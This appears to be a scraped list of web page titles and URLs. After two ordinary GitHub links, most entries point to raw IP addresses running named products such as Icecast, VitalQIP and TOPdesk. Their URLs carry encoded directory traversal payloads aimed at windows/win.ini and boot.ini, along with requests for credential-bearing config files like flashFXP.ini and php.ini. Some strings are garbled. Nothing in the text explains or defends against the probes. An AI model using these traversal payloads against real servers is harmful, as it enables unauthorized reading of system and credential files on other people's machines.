macros/e3 Help.ini at master - GitHub,https://github.com/ebzent73/macros/blob/master/e3%2520Includes/e3%2520Help.ini
porter2/full.ini at master - GitHub,https://github.com/markfullmer/porter2/blob/master/test/Datasets/full.ini
Icecast Administration Admin Page - Login,http://61.62.66.140/login.cgi/inc//..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini
Azureus,http://31.220.45.118/.ssh/Activex/flashFXP.ini
Mail Server CMailServer Webmail - remote,http://103.225.3.157/phpSysInfo/comments/sources/preferences.ini
VitalQIP IP Management System,http://222.156.247.133/login.asp/0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c....%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows%255Cwin.inix5cwindows/win.ini
VitalQIP IP Management System - Novell Web Services,http://222.156.247.176/loginok/pages/Citrix/netscape.ini
teamspeak - VitalQIP IP Management System,http://210.242.146.146/login/.br/perl/php.ini
EXTRANET login,http://210.203.16.152/login/servlet/view/..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
PHPBTTracker Statistics,http://210.203.16.158/login_admin/install/%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
Untitled,http://61.64.230.188/comments/perl/netscape.ini
TOPdesk ApplicationServer,http://210.63.253.164/loginflat/.br/2082//..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255cboot.ini
iDevAffiliate,http://210.200.17.186/loginsuper/%2522ftp://admin/flashFXP.ini
